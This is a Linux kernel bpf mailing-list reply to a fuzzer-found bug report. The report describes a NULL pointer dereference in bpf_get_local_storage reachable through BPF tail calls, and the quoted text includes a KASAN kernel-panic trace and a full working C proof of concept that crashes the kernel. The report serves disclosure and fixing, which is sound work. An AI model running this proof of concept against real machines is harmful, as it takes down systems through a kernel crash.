Return-Path: <bpf+bounces-75395-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from dfw.mirrors.kernel.org (dfw.mirrors.kernel.org [142.0.200.124])
	by mail.lfdr.de (Postfix) with ESMTPS id 748C0C8270B
	for <lists+bpf@lfdr.de>; Mon, 24 Nov 2025 21:48:09 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by dfw.mirrors.kernel.org (Postfix) with ESMTPS id 371A94E2C1A
	for <lists+bpf@lfdr.de>; Mon, 24 Nov 2025 20:48:08 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 0BF56258ECC;
	Mon, 24 Nov 2025 20:48:04 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="C3CQu4Gu"
X-Original-To: bpf@vger.kernel.org
Received: from mail-yw1-f175.google.com (mail-yw1-f175.google.com [209.85.128.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9634018A93F
	for <bpf@vger.kernel.org>; Mon, 24 Nov 2025 20:48:01 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.175
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1764017283; cv=none; b=ZXPdNevwj45JT784DI4Qmb6ddY/OX7uZYl+4GHtAeTfFjXRvXVxLfF2m54CV9IYIWRWc+Ty3aBZWXRk2ufFy3IQgxBgP1NIt/Xrc2wqLy19pVFqvnNAgM7t9DUngUkk9ctiVQYpBmQizSZ/78Iepu5dLGpw0Zfe0jsQPUYpAB6c=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1764017283; c=relaxed/simple;
	bh=dSbpXdKusLk4vRy3Wg4LmjnbuIXIzv+gigjtvYuvQbM=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=rJkuyuS6fl2VTtAJcF8iKW+JF2mY0TmzOhrxuONnpLn+0nbVxIyyLP838k741IIEPfNVTKQzNwZBjl3RVQ3g5LTJ8kNvX1e6Kprl3KfbU92rpx7d5EWsVLxIZnZeLbukVQmoZcSotfzy1jSX8ZD2dNeJfEYZzU/8CDZS8fl1fgc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=C3CQu4Gu; arc=none smtp.client-ip=209.85.128.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-yw1-f175.google.com with SMTP id 00721157ae682-78a6a7654a4so46878417b3.0
        for <bpf@vger.kernel.org>; Mon, 24 Nov 2025 12:48:01 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1764017280; x=1764622080; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=zjFf9F6vXKfhdytU8z6Jwx6JFZum1f1+AtnSNoKwdB0=;
        b=C3CQu4GuRoybD8GK4cB1w0Yhyux4p5nn8eJzPPWPsmX+ZdyYGWvpisSRXxJ6GHhdHJ
         j4Qi9uQ58AkLmj28FhbJyGuMHSfA4YFC2G2J4qVT1azrK9SYPTeH3+sbuJlmnE1VAbS0
         3fXjDErzED+ygPNJjtwtPmHbdzrsXDNt7uru7HkAq8FxAEl+vtr0QdNTFj4gVgjF55s3
         Ru3kNuI8tnYJ/Gi+yqvniBUeZ7rEWlapNGZwthJTokkUDfBwVpwng49ZRTuUdEz7UlaS
         ppSGoA8j9F8HtpvOs2qlqFfoqfPiIgCsR12Gc7YQj/dHt27+oEAE9UaMDfHWsQNpeuqy
         UgZg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1764017280; x=1764622080;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=zjFf9F6vXKfhdytU8z6Jwx6JFZum1f1+AtnSNoKwdB0=;
        b=KXUbcExLa4xRsKLeEYuQ1QQRoTfkRBIFZTIt7QRyVN07F4YI0hyaxmRM4WFphEx9zt
         0DZo75JMDAyN4M8lbu3vnUHLDY0jZpmRGKDQQMrobMlfGzGUHml7zi06CeO+cAI5F0ct
         8RbpJXs3WR6rltezfRORuy3BE60WMJcRhXbqHgkzTALOzbB28yM47PFDAHv+2NaRdwLz
         MVldOHWnWKZllhfJh3h6Sj+HW6wiCr+oZ8T3BaKTcNCuQbPWOjEzGB1GQMSDDGurFIkd
         yo+qGphFvWcaDWzVQGHSE9Qmyva5WB6NA7IkUbxlyZ0y9vmu9rMIGJ7OMj8YZBwzjT37
         zqQA==
X-Forwarded-Encrypted: i=1; AJvYcCXi9OfdjRV7xz96vmlSFMlJB6HKeCUtNR41x54RM35PeSdJ0vMlZ4xxi82L5vjTZMez9BQ=@vger.kernel.org
X-Gm-Message-State: AOJu0Yxkpt5KyhaJg3r6nv78x+ppBu+5erRPPsR2D9a3Dn6X5J+Fgltz
	YK8MZmU3ZKcrrRsTyOzXuUH5mfoFib3wedqoD3ginuXJumHfHPIcyi/SBQW2Qxc9AknZPfYfBhP
	PVq2P4ZAvGaEyXSc2UMQ9jqqgJpjLYGE=
X-Gm-Gg: ASbGncsormQ1h1tu8O16cpty1u3HUHBMbBDo9bc1g8eMdQKiVjjACdlHe2Qwagy+JPa
	3ikoONqrJzpD9u2e5wcPZSxFyuUvn1Jx+jW+dFh+zH7fuT7PKeNNaRPZwqwbViHvcGkRQ7AfsmR
	c/Fc3P58mSONgq1ys/R77fIPJJ45XBmVTMkeSVZLAzztthvcflRmSzeCuK+mVTOJDmP0V17fivq
	4I1OLO4o43drHrVqfuN89wQVCzf5tHEiDYMcWR+yRcbL81HIJpG0qnCoLDOdicTcGQxX9faojqa
	PjtjElc3HfC/EWPAO/GCqQ==
X-Google-Smtp-Source: AGHT+IECsm9q0rqX+sxUjdJ3dtO3WekTzt2set8/m2B8Yz0c8dC2kjM0KbkNel2adxeEV1l2TMRfRrsANYA21YnyRew=
X-Received: by 2002:a05:690c:6c12:b0:786:314f:849a with SMTP id
 00721157ae682-78a8b49200bmr115727427b3.17.1764017280378; Mon, 24 Nov 2025
 12:48:00 -0800 (PST)
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <c9ac63d7-73be-49c5-a4ac-eb07f7521adb@hust.edu.cn>
In-Reply-To: <c9ac63d7-73be-49c5-a4ac-eb07f7521adb@hust.edu.cn>
From: Amery Hung <ameryhung@gmail.com>
Date: Mon, 24 Nov 2025 12:47:49 -0800
X-Gm-Features: AWmQ_blGy6E3bBaBcJVeSRM3xW3fosXmIflTtM1f8lHlBh0bc2a1zwGYeVbL_8w
Message-ID: <CAMB2axMN2mMy=mHjtprd=HN-5enmwX=VSPUdM051V=fgFtjKWg@mail.gmail.com>
Subject: Re: GPF in bpf_get_local_storage due to missing cgroup storage check
 in tail calls
To: Yinhao Hu <dddddd@hust.edu.cn>
Cc: Daniel Borkmann <daniel@iogearbox.net>, bpf <bpf@vger.kernel.org>, dzm91@hust.edu.cn, 
	M202472210@hust.edu.cn, martin.lau@linux.dev, 
	Alexei Starovoitov <ast@kernel.org>, Andrii Nakryiko <andrii@kernel.org>, 
	hust-os-kernel-patches@googlegroups.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Mon, Nov 24, 2025 at 1:19=E2=80=AFAM Yinhao Hu <dddddd@hust.edu.cn> wrot=
e:
>
> Our fuzzer tool discovered a NULL pointer dereference in the
> `bpf_get_local_storage()` helper function. This issue can lead to a
> general protection fault when executing specific BPF program sequences
> involving tail calls and Cgroup Local Storage. The verification process
> for `BPF_MAP_TYPE_PROG_ARRAY` ensures that the Callee is compatible with
> the map, but it fails to strictly enforce that the Caller has allocated
> the necessary Cgroup Storage resources required by the Callee. If a
> Caller (which does not use Cgroup Storage) tail calls into a Callee
> (which does use `BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE`), the Callee runs
> in a context where the storage pointer is `NULL`. The
> `bpf_get_local_storage()` helper in the Callee attempts to dereference
> this `NULL` storage pointer, causing a crash.
>
> By manipulating the `BPF_MAP_TYPE_PROG_ARRAY` ownership (assigning it
> first to a program that does use storage), we can bypass the initial
> compatibility checks and insert a storage-using program into the array,
> which can then be invoked by a non-storage-using Caller.
>
> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
>
> ## Reproduction Steps
>
> 1.  Setup: Create a `BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE` map and a
> `BPF_MAP_TYPE_PROG_ARRAY` map.
> 2.  Establish Owner: Load a dummy "Owner" program (Prog C) that
> references both maps. This sets the `PROG_ARRAY`'s owner attributes to
> expect storage usage.
> 3.  Load Callee: Load the target program (Prog B) that uses the storage
> map and calls `bpf_get_local_storage()`.
> 4.  Load Caller: Load the malicious caller program (Prog A) that uses
> the `PROG_ARRAY` but not the storage map. The verifier allows this due
> to a permissive check on tail call compatibility.
> 5.  Update Map: Insert Prog B into the `PROG_ARRAY`.
> 6.  Trigger: Execute Prog A via `BPF_PROG_TEST_RUN`. It tail calls into
> Prog B, which crashes upon accessing the missing storage.
>
> ## KASAN Report
>
> The following C program should demonstrate the vulnerability on
> linux-next 6.18.0-rc6-next-20251121:

Thanks for reporting. I tested the POC on bpf-next and can still reproduce.

I took a brief look at the cgroup local storage code. The problem
seems to be bpf_get_local_storage() not checking if a cgroup local
storage is created. A cgroup local storage is created on program
attachment (prog A), which never happens. Then a tail call into prog B
deference the not-allocated-yet storage.

Just thinking out loud. Maybe a if (storage) check before
dereferencing would be enough? Also need to look more to see if there
are other ways to trigger this type of bug.

>
> ```
> [   87.795255] Oops: general protection fault, probably for
> non-canonical address 0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
> [   87.796199] KASAN: null-ptr-deref in range
> [0x0000000000000000-0x0000000000000007]
> [   87.796952] CPU: 0 UID: 0 PID: 350 Comm: poc Not tainted
> 6.18.0-rc6-next-20251121 #9 PREEMPT(none)
> [   87.797863] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX,
> 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> [   87.798828] RIP: 0010:bpf_get_local_storage+0x106/0x1c0
> [   87.799403] Code: 48 8d 7b 10 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85
> 9d 00 00 00 48 b8 00 00 00 00 00 fc ff df 48 8b 5b 10 48 89 da 48 c1 ea
> 03 <80> 3c 02 00 0f 85 88 00 00 00 48 8b 1b e8 58 8c b5 03 89 c5 3d ff
> [   87.801321] RSP: 0018:ffff8881042675b8 EFLAGS: 00010256
> [   87.801860] RAX: dffffc0000000000 RBX: 0000000000000000 RCX:
> 1ffffffff1359c34
> [   87.802583] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
> ffff888104267700
> [   87.803356] RBP: 0000000000000015 R08: 0000000000000001 R09:
> 0000000000000000
> [   87.804074] R10: ffff888113aaf000 R11: ffff888113aaf0bc R12:
> ffff888104267930
> [   87.804816] R13: ffffc900005c7000 R14: ffff888104267730 R15:
> ffffed10227ea641
> [   87.805563] FS:  0000000029cbc380(0000) GS:ffff8881911ff000(0000)
> knlGS:0000000000000000
> [   87.806467] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [   87.807080] CR2: 00000000004a0000 CR3: 000000010317f000 CR4:
> 0000000000750ef0
> [   87.807852] PKRU: 55555554
> [   87.808150] Call Trace:
> [   87.808447]  <TASK>
> [   87.808703]  bpf_prog_09b98cd0bcd009a1+0x1d/0x28
> [   87.809209]  bpf_test_run+0x47b/0xcd0
> [   87.809620]  ? __pfx_bpf_test_run+0x10/0x10
> [   87.810086]  ? check_bytes_and_report+0xd0/0x150
> [   87.811109]  ? __asan_memset+0x1f/0x40
> [   87.811544]  bpf_prog_test_run_skb+0xea9/0x3570
> [   87.812059]  ? __pfx_bpf_prog_test_run_skb+0x10/0x10
> [   87.813150]  ? __pfx_bpf_check_uarg_tail_zero+0x10/0x10
> [   87.813733]  __sys_bpf+0xac0/0x5110
> [   87.814123]  ? __pfx___sys_bpf+0x10/0x10
> [   87.815056]  ? kfree+0x19b/0x510
> [   87.815931]  ? __sys_bpf+0x2ca1/0x5110
> [   87.816906]  ? __sys_bpf+0x1b2f/0x5110
> [   87.817316]  ? __pfx___sys_bpf+0x10/0x10
> [   87.818752]  __x64_sys_bpf+0x74/0xc0
> [   87.819134]  do_syscall_64+0x76/0x4e0
> [   87.820630]  ? do_syscall_64+0xa2/0x4e0
> [   87.821606]  ? do_syscall_64+0x24c/0x4e0
> [   87.822558]  ? switch_fpu_return+0xf6/0x200
> [   87.823570]  ? do_syscall_64+0x24c/0x4e0
> [   87.824039]  ? handle_mm_fault+0x1ab/0x900
> [   87.824518]  ? lock_mm_and_find_vma+0x58/0x720
> [   87.825562]  ? do_user_addr_fault+0x863/0xf40
> [   87.826595]  ? irqentry_exit+0x54/0x6a0
> [   87.827025]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
> [   87.827716] RIP: 0033:0x41233d
> [   87.828074] Code: b3 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa
> 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f
> 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
> [   87.830029] RSP: 002b:00007fffbf5d6be8 EFLAGS: 00000206 ORIG_RAX:
> 0000000000000141
> [   87.830840] RAX: ffffffffffffffda RBX: 0000000000000001 RCX:
> 000000000041233d
> [   87.831604] RDX: 0000000000000090 RSI: 00007fffbf5d6cd0 RDI:
> 000000000000000a
> [   87.832367] RBP: 00007fffbf5d6c00 R08: 00007fffbf5d6cd0 R09:
> 00007fffbf5d6cd0
> [   87.833149] R10: 00007fffbf5d6cd0 R11: 0000000000000206 R12:
> 00007fffbf5d7f08
> [   87.833975] R13: 00007fffbf5d7f18 R14: 00000000004a5f68 R15:
> 0000000000000001
> [   87.834744]  </TASK>
> [   87.835012] Modules linked in:
> [   87.835450] ---[ end trace 0000000000000000 ]---
> [   87.835917] RIP: 0010:bpf_get_local_storage+0x106/0x1c0
> [   87.836462] Code: 48 8d 7b 10 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85
> 9d 00 00 00 48 b8 00 00 00 00 00 fc ff df 48 8b 5b 10 48 89 da 48 c1 ea
> 03 <80> 3c 02 00 0f 85 88 00 00 00 48 8b 1b e8 58 8c b5 03 89 c5 3d ff
> [   87.838321] RSP: 0018:ffff8881042675b8 EFLAGS: 00010256
> [   87.838884] RAX: dffffc0000000000 RBX: 0000000000000000 RCX:
> 1ffffffff1359c34
> [   87.839671] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
> ffff888104267700
> [   87.840415] RBP: 0000000000000015 R08: 0000000000000001 R09:
> 0000000000000000
> [   87.841143] R10: ffff888113aaf000 R11: ffff888113aaf0bc R12:
> ffff888104267930
> [   87.841934] R13: ffffc900005c7000 R14: ffff888104267730 R15:
> ffffed10227ea641
> [   87.842713] FS:  0000000029cbc380(0000) GS:ffff8881911ff000(0000)
> knlGS:0000000000000000
> [   87.843547] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [   87.844138] CR2: 00000000004a0000 CR3: 000000010317f000 CR4:
> 0000000000750ef0
> [   87.844877] PKRU: 55555554
> [   87.845181] Kernel panic - not syncing: Fatal exception in interrupt
> [   87.845984] Kernel Offset: disabled
> [   87.846339] ---[ end Kernel panic - not syncing: Fatal exception in
> interrupt ]---
> ```
>
> ## Proof of Concept
>
> ```c
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <unistd.h>
> #include <sys/syscall.h>
> #include <linux/bpf.h>
> #include <string.h>
> #include <errno.h>
>
> #ifndef __NR_bpf
> #define __NR_bpf 321
> #endif
>
> #define BPF_MOV64_IMM(DST, IMM) \
>         ((struct bpf_insn){.code =3D BPF_ALU64 | BPF_MOV | BPF_K, .dst_re=
g =3D DST,
> .imm =3D IMM})
>
> #define BPF_LD_MAP_FD(DST, MAP_FD) \
>         ((struct bpf_insn){.code =3D BPF_LD | BPF_DW | BPF_IMM, .dst_reg =
=3D DST,
> .src_reg =3D BPF_PSEUDO_MAP_FD, .imm =3D MAP_FD}), \
>         ((struct bpf_insn){.code =3D 0, .imm =3D 0})
>
> #define BPF_CALL_FUNC(FUNC) \
>         ((struct bpf_insn){.code =3D BPF_JMP | BPF_CALL, .imm =3D FUNC})
>
> #define BPF_EXIT_INSN() \
>         ((struct bpf_insn){.code =3D BPF_JMP | BPF_EXIT})
>
> static inline int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr,
> unsigned int size) {
>         return syscall(__NR_bpf, cmd, attr, size);
> }
>
> int main(void) {
>         union bpf_attr attr =3D {};
>         char log_buf[4096];
>         int storage_map, prog_array, prog_a, prog_b, prog_c;
>
>         // 1.1 Create Per-CPU Cgroup Storage Map
>         struct { __u64 cgroup_inode_id; __u32 attach_type; } key =3D {};
>         attr.map_type =3D BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE;
>         attr.key_size =3D sizeof(key);
>         attr.value_size =3D 8;
>         storage_map =3D sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
>         if (storage_map < 0) return 1;
>
>         // 1.2 Create Prog Array
>         memset(&attr, 0, sizeof(attr));
>         attr.map_type =3D BPF_MAP_TYPE_PROG_ARRAY;
>         attr.key_size =3D 4;
>         attr.value_size =3D 4;
>         attr.max_entries =3D 1;
>         prog_array =3D sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
>         if (prog_array < 0) return 1;
>
>         // 2. Load Prog C (Dummy Owner)
>         struct bpf_insn insns_c[] =3D {
>                 BPF_LD_MAP_FD(BPF_REG_1, storage_map),
>                 BPF_LD_MAP_FD(BPF_REG_2, prog_array),
>                 BPF_MOV64_IMM(BPF_REG_0, 1),
>                 BPF_EXIT_INSN(),
>         };
>         memset(&attr, 0, sizeof(attr));
>         attr.prog_type =3D BPF_PROG_TYPE_CGROUP_SKB;
>         attr.insns =3D (unsigned long)insns_c;
>         attr.insn_cnt =3D sizeof(insns_c) / sizeof(struct bpf_insn);
>         attr.license =3D (unsigned long)"GPL";
>         prog_c =3D sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
>         if (prog_c < 0) return 1;
>
>         // 3. Load Prog B (Callee)
>         struct bpf_insn insns_b[] =3D {
>                 BPF_LD_MAP_FD(BPF_REG_1, storage_map),
>                 BPF_MOV64_IMM(BPF_REG_2, 0),
>                 BPF_CALL_FUNC(BPF_FUNC_get_local_storage),
>                 BPF_MOV64_IMM(BPF_REG_0, 1),
>                 BPF_EXIT_INSN(),
>         };
>         attr.insns =3D (unsigned long)insns_b;
>         attr.insn_cnt =3D sizeof(insns_b) / sizeof(struct bpf_insn);
>         attr.log_buf =3D (unsigned long)log_buf;
>         attr.log_size =3D sizeof(log_buf);
>         attr.log_level =3D 1;
>         prog_b =3D sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
>         if (prog_b < 0) return 1;
>
>         // 4. Load Prog A (Caller)
>         struct bpf_insn insns_a[] =3D {
>                 BPF_LD_MAP_FD(BPF_REG_2, prog_array),
>                 BPF_MOV64_IMM(BPF_REG_3, 0),
>                 BPF_CALL_FUNC(BPF_FUNC_tail_call),
>                 BPF_MOV64_IMM(BPF_REG_0, 1),
>                 BPF_EXIT_INSN(),
>         };
>         attr.insns =3D (unsigned long)insns_a;
>         attr.insn_cnt =3D sizeof(insns_a) / sizeof(struct bpf_insn);
>         prog_a =3D sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
>         if (prog_a < 0) return 1;
>
>         // 5. Update Prog Array
>         int key_0 =3D 0;
>         memset(&attr, 0, sizeof(attr));
>         attr.map_fd =3D prog_array;
>         attr.key =3D (unsigned long)&key_0;
>         attr.value =3D (unsigned long)&prog_b;
>         if (sys_bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)) < 0) return=
 1;
>
>         // 6. Run Program A
>         char data[128] =3D {};
>         memset(&attr, 0, sizeof(attr));
>         attr.test.prog_fd =3D prog_a;
>         attr.test.data_in =3D (unsigned long)data;
>         attr.test.data_size_in =3D sizeof(data);
>         attr.test.repeat =3D 1;
>         sys_bpf(BPF_PROG_TEST_RUN, &attr, sizeof(attr));
>
>         return 0;
> }
> ```

